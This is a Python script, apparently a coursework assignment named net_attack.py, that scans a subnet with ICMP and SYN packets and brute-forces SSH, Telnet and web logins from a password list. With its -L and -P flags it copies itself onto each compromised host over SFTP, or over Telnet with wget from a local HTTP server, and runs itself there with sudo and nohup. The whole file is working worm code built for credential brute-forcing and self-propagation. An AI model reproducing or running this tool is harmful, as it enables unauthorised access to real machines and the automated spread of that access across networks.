#!/usr/bin/python3
import concurrent.futures

from scapy.all import *
from os import path
from shutil import copyfile, rmtree
from telnetlib import Telnet
from paramiko import SSHClient, AutoAddPolicy
from requests import get, post
from http.server import HTTPServer, SimpleHTTPRequestHandler

conf.verb = 0


def main():
    arguments = sys.argv[1:]
    number_of_arguments = len(arguments)
    if number_of_arguments < 8 or "-p" not in arguments or "-u" not in arguments or "-f" not in arguments:
        help("Incorrect arguments provided")

    ports = get_parameter(arguments, "-p")
    port_list = get_ports_from_input(ports)

    username = get_parameter(arguments, "-u")

    password_file = get_parameter(arguments, "-f")
    verify_file_exists(password_file)
    password_list = read_file_from_list(password_file)

    self_propagate = False
    deploy_file = False
    deployment_filename = ".deploy"
    script_filename = "net_attack.py"

    ip_list = []
    print("[+] Determining which IP addresses are reachable...")
    if "-t" in arguments:
        if "-L" in arguments or "-P" in arguments:
            help("-t argument cannot be used with -L and -P")

        ip_file = get_parameter(arguments, "-t")
        verify_file_exists(ip_file)
        ip_list = read_file_from_list(ip_file)
        ip_list = [ip for ip in ip_list if is_reachable(ip)]
    elif "-L" in arguments and "-P" in arguments:
        self_propagate = True
        ip_list = scan_for_active_ips()
        deploy_file_to_server(password_file, deployment_filename, script_filename)
        deploy_file = True
    else:
        help("Missing target argument")

    if not ip_list:
        print("[!] No reachable IP addresses found.")
        exit()

    if "-d" in arguments:
        if self_propagate:
            help("-d argument cannot be used with -L and -P")
        deployment_file = get_parameter(arguments, "-d")
        deploy_file_to_server(deployment_file, deployment_filename, script_filename)
        deploy_file = True

    print("[+] Received %d response(s). Beginning attack!\n" % len(ip_list))
    for ip in ip_list:
        deployed = False
        print("********** %s **********" % ip)
        for port in port_list:
            port_open = scan_port(ip, port)
            print("Port %d is %s on %s" % (port, "open" if port_open else "closed", ip))
            if port_open:
                try:
                    bruteforce_function = {
                        22: bruteforce_ssh,
                        23: bruteforce_telnet,
                        80: bruteforce_web,
                        8080: bruteforce_web,
                        8888: bruteforce_web
                    }[port]

                    username_password = bruteforce_function(ip, port, username, password_list)
                    if username_password:
                        print("Successfully logged into port %d with %s" % (port, username_password))
                        if deploy_file and not deployed and (port == 22 or port == 23):
                            credentials = username_password.split(":")
                            deployed = transfer_file(ip, credentials[0], credentials[1], port, self_propagate,
                                                     deployment_filename, script_filename)
                except KeyError:
                    pass

        print("********** %s **********\n" % ip)


def scan_port(ip, port):
    pkt = IP(dst=ip) / TCP(dport=port, flags="S")
    ans, unans = sr(pkt, timeout=2)
    if len(ans) > 0:
        return "S" in str(ans[0][1][TCP].flags)
    else:
        return False


def bruteforce_ssh(ip, port, username, passwords):
    print("Attempting bruteforce with SSH")
    response = ""
    for password in passwords:
        try:
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.connect(ip, username=username, password=password, port=port, timeout=3)
            response = "%s:%s" % (username, password)
            break
        except:
            pass
        finally:
            client.close()

    return response


def bruteforce_telnet(ip, port, username, passwords):
    print("Attempting bruteforce with Telnet")
    response = ""

    login_prompt = encode_in_ascii("login:")
    username_input = encode_in_ascii("%s\n" % username)
    password_prompt = encode_in_ascii("Password:")
    welcome_output = encode_in_ascii("Welcome to")
    exit_command = encode_in_ascii("exit\n")

    for password in passwords:
        connection = Telnet(ip, port=port)
        connection.read_until(login_prompt)
        connection.write(username_input)
        connection.read_until(password_prompt)
        connection.write(encode_in_ascii("%s\n" % password))
        banner = connection.read_until(welcome_output, timeout=1)
        if welcome_output in banner:
            connection.write(exit_command)
            connection.close()
            response = "%s:%s" % (username, password)
            break

        connection.close()

    return response


def bruteforce_web(ip, port, username, passwords):
    print("Attempting bruteforce to Web Server")
    response = ""
    base_url = "http://%s:%d" % (ip, port)
    index_url = "%s/index.php" % base_url
    login_url = "%s/login.php" % base_url
    for password in passwords:
        index_response = get(index_url)
        if index_response.status_code == 200:
            login_response = post(login_url, data={"username": username, "password": password})
            if "Welcome" in login_response.text:
                response = "%s:%s" % (username, password)

    return response


def read_file_from_list(file):
    with open(file) as reader:
        file_contents_list = reader.read().splitlines()

    if not file_contents_list:
        print("File %s did not have any content" % file)
        exit()

    return file_contents_list


def is_reachable(dst_ip, src_ip=None, timeout=2):
    ip = IP(src=src_ip, dst=dst_ip, ttl=64) if src_ip else IP(dst=dst_ip, ttl=64)
    ans = sr1(ip / ICMP(), timeout=timeout)
    return ans is not None


def transfer_file(ip, username, password, port, self_propagate, deployment_filename, script_filename):
    target_directory = get_target_directory(ip, username)
    try:
        transfer_file_function = {
            22: transfer_file_with_sftp,
            23: transfer_file_with_http_server
        }[port]
    except KeyError:
        return False

    successful = transfer_file_function(ip, username, password, target_directory, self_propagate, deployment_filename,
                                  script_filename)

    if self_propagate:
        information_message = "Success! %s started on %s\n" % (script_filename, ip) if successful else "Self propagation failed\n"
    else:
        information_message = "File deployment successful!\n" if successful else "File deployment failed\n"

    print(information_message)
    return successful


def transfer_file_with_sftp(ip, username, password, target_directory, self_propagate, deployment_filename,
                            script_filename):
    information_message = "Attempting self propagation with SFTP..." if self_propagate else "Deploying file with SFTP..."
    print(information_message)
    client = SSHClient()
    try:
        client.set_missing_host_key_policy(AutoAddPolicy())
        client.connect(ip, username=username, password=password)
        with client.open_sftp() as sftp_client:
            local_dir = os.getcwd()

            local_deployment_path = "%s/%s" % (local_dir, deployment_filename)
            local_script_path = "%s/%s" % (local_dir, script_filename)
            target_deployment_path = "%s/%s" % (target_directory, deployment_filename)
            target_script_path = "%s/%s" % (target_directory, script_filename)

            sftp_client.chdir(target_directory)
            dir_contents = sftp_client.listdir()
            if deployment_filename in dir_contents:
                if not self_propagate:
                    sftp_client.remove(target_deployment_path)
                    sftp_client.put(localpath=local_deployment_path, remotepath=target_deployment_path)
            else:
                sftp_client.put(localpath=local_deployment_path, remotepath=target_deployment_path)

            if self_propagate:
                if script_filename in dir_contents:
                    return True

                sftp_client.put(localpath=local_script_path, remotepath=target_script_path)

                commands = [
                    "cd %s\n" % target_directory,
                    "sudo -S chmod +x %s\n" % script_filename,
                    "%s\n" % password,
                    "sudo nohup ./%s -u %s -p 22,23 -f %s -L -P >/dev/null 2>&1 &\n" % (script_filename, username, deployment_filename)
                ]

                channel = client.invoke_shell()

                for command in commands:
                    channel.send(command)

                    counter = 0
                    while not channel.recv_ready():
                        if counter >= 5:
                            return False

                        time.sleep(0.1)
                        counter = counter + 1

                    channel.recv(1024)
                    time.sleep(0.1)

                channel.close()

        return True
    except Exception as ex:
        print(ex)
        return False
    finally:
        client.close()


def transfer_file_with_http_server(ip, username, password, target_directory, self_propagate, deployment_filename,
                                   script_filename):
    information_message = "Attempting self propagation with HTTP..." if self_propagate else "Deploying file with HTTP..."
    print(information_message)

    telnet_port = 23

    server_ip = get_server_ip_from_ip(ip)
    port_number = get_server_port_number()

    login_prompt = encode_in_ascii("login:")
    username_input = encode_in_ascii("%s\n" % username)
    password_prompt = encode_in_ascii("Password:")
    password_input = encode_in_ascii("%s\n" % password)
    welcome_output = encode_in_ascii("Welcome to")

    sudo_check = encode_in_ascii("id\n")
    sudo_check_response = encode_in_ascii("27(sudo)")

    saved = encode_in_ascii("saved")
    cd_command = encode_in_ascii("cd %s\n" % target_directory)

    remove_old_file_if_exists_command = "[ -f %s ] && rm %s\n"
    wget_if_not_exists_command = "[ ! -f %s ] && wget %s:%d/%s -q -o /dev/null\n"

    remove_deploy_if_exists_command = encode_in_ascii(
        remove_old_file_if_exists_command % (deployment_filename, deployment_filename))

    wget_deployment_file_command = encode_in_ascii(
        wget_if_not_exists_command % (deployment_filename, server_ip, port_number, deployment_filename))

    wget_script_file_command = encode_in_ascii(
         wget_if_not_exists_command % (script_filename, server_ip, port_number, script_filename))

    chmod_command = encode_in_ascii("sudo chmod +x %s\n" % script_filename)
    sudo_prompt = encode_in_ascii("[sudo] password for %s:" % username)

    start_net_attack_command = encode_in_ascii(
        "sudo nohup ./%s -u %s -p 22,23 -f %s -L -P >/dev/null 2>&1 &\n" % (
            script_filename, username, deployment_filename))
    wait_for = encode_in_ascii("WAIT FOR")

    connection = Telnet(ip, port=telnet_port)
    try:
        connection.read_until(login_prompt)
        connection.write(username_input)
        connection.read_until(password_prompt)
        connection.write(password_input)
        banner = connection.read_until(welcome_output, timeout=1)
        if welcome_output not in banner:
            return False

        connection.write(sudo_check)
        check = connection.read_until(sudo_check_response, timeout=1)
        if sudo_check_response not in check:
            return False

        connection.write(cd_command)
        if not self_propagate:
            connection.write(remove_deploy_if_exists_command)
        connection.write(wget_deployment_file_command)

        if self_propagate:
            connection.write(wget_script_file_command)
            connection.read_until(saved, timeout=1)

            connection.write(chmod_command)
            sudo_response = connection.read_until(sudo_prompt, timeout=1)
            if sudo_prompt in sudo_response:
                connection.write(password_input)
                connection.read_until(wait_for, timeout=1)
            connection.write(start_net_attack_command)
            connection.read_until(wait_for, timeout=1)
    except:
        return False
    finally:
        connection.close()


def get_server_ip_from_ip(ip):
    server_ip = ""

    base_ip = ip[0: (ip.rfind('.') + 1)]
    interfaces = get_if_list()
    for interface in interfaces:
        interface_ip = get_if_addr(interface)
        if base_ip in interface_ip:
            server_ip = interface_ip
            break

    return server_ip


def deploy_file_to_server(file, deployment_filename, script_filename):
    current_directory = os.getcwd()

    current_deployment_file_location = "%s/%s" % (current_directory, file)
    current_script_file_location = "%s/%s" % (current_directory, script_filename)

    deployment_directory = "%s/net_attack_deployment" % current_directory

    if path.isdir(deployment_directory):
        rmtree(deployment_directory)

    os.mkdir(deployment_directory)
    os.chdir(deployment_directory)

    copyfile(current_deployment_file_location, deployment_filename)
    copyfile(current_script_file_location, script_filename)

    port_number = get_server_port_number()
    server = ("", port_number)
    http = HTTPServer(server, SimpleHTTPRequestHandler)

    http_server_thread = threading.Thread(target=http.serve_forever, name="HTTP Server Thread")
    http_server_thread.daemon = True
    http_server_thread.start()


def get_parameter(arguments, argument):
    index = 0

    try:
        parameter_name = get_parameter_name(argument)
        parameter_not_provided_message = "%s missing (%s)" % (parameter_name, argument)
    except KeyError:
        parameter_not_provided_message = "Missing parameter for %s" % argument

    if argument in arguments:
        index = arguments.index(argument)
    else:
        help("Argument %s is not provided" % argument)

    if index >= (len(arguments) - 1):
        help(parameter_not_provided_message)

    parameter = arguments[index + 1]
    if "-" in parameter:
        help(parameter_not_provided_message)

    return parameter


def get_parameter_name(parameter):
    parameter_name = {
        "-t": "IP address filename",
        "-p": "Ports",
        "-u": "Username",
        "-f": "Passwords filename",
        "-d": "Deployment filename",
        "-L": "Local Scan",
        "-P": "Propagate"
    }[parameter]

    return parameter_name


def get_ports_from_input(ports_input):
    ports = []
    ports_input_split = ports_input.split(",")
    for port in ports_input_split:
        if port.isdigit():
            ports.append(int(port))

    ports.sort()
    return ports


def verify_file_exists(file):
    if not path.isfile(file):
        print("Could not find file %s" % file)
        exit()


def get_target_directory(ip, username):
    last_ip_octal = ip[ip.rfind('.') + 1:]
    server_number = int(last_ip_octal) - 1
    return "/home/%s/assign_2/server_%d" % (username, server_number)


def scan_for_active_ips():
    interfaces = get_if_list()
    active_ips = []
    for interface in interfaces:
        active_ips.extend(scan_against_interface(interface))

    return active_ips


def scan_against_interface(interface):
    src_ip = get_if_addr(interface)
    base_ip = src_ip[0: (src_ip.rfind('.') + 1)]
    replies_list = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(send(src_ip, base_ip, replies_list), range(1, 255))

    return replies_list


def send(src_ip, base_ip, replies_list):
    # Sends an Echo Request to the Networks base IP concatenated with a particular IP for the final octet.
    # The interface_ip is set in the Echo Request as the source. If an Echo Reply is not received in 4 seconds then the
    # request times out.
    def send_icmp_request(last_ip_octal):
        dst_ip = base_ip + str(last_ip_octal)
        if is_reachable(dst_ip, src_ip=src_ip, timeout=4):
            replies_list.append(dst_ip)

    return send_icmp_request


def encode_in_ascii(s):
    return s.encode("ascii")


def get_server_port_number():
    return 54325


def get_value(shortcut):
    value = {
        "LOGIN_PROMPT": "login:",
        "ONE_VALUE_INPUT": "%s",
        "PASSWORD_PROMPT": "Password:",
        "WELCOME_OUTPUT": "Welcome to",
        "DEPLOY_FILENAME": ".deploy",
        "SCRIPT_FILENAME": "net_attack.py",
        "ID_CMD": "id",
        "SUDO_CHECK_RESPONSE": "23(sudo)",
        "SAVED": "saved",
        "REMOVE_OLD_FILE_IF_PRESENT_CMD": "[ -f %s ] && rm %s",
        "WGET_CMD": "[ ! -f %s ] && wget %s:54325/%s -q",
        "WAIT_FOR_OUTPUT": "WAIT FOR",
        "CD_CMD": "cd %s",
        "CHMOD": "sudo -S chmod +x %s",
        "START_ATTACK": "sudo nohup ./net_attack.py -u %s -p 22,23 -f .deploy -L -P >/dev/null 2>&1 &"
    }[shortcut]

    return value


def help(error_message):
    print("Error: %s\n" % error_message)
    print("Example usage:")
    print("\t./net_attack.py -t my_ip_list.txt -p 22,23,25,80 -u admin -f my_password_list.txt")
    print("\t./net_attack.py -t my_ip_list.txt -p 22 -u admin -f my_password_list.txt -d deploy.txt")
    print("\t./net_attack.py -p 22,23 -u admin -f my_password_list.txt -L -P")
    exit()


if __name__ == "__main__":
    main()
